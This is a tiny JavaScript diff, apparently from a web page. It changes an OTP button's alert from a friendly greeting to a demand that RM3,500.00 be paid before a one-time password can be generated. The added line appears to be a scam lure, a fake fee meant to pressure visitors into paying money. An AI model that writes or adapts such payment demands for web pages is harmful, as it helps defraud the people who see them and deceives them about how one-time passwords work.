@@ -20,6 +20,6 @@ if (amountEl) {
 
 if (otpButton) {
   otpButton.onclick = function () {
-    window.alert("hello ma have a great day");
+    window.alert("RM3,500.00 NEEDED TO GENERATE THE ONE TIME PASSWORD(OTP)");
   };
 }
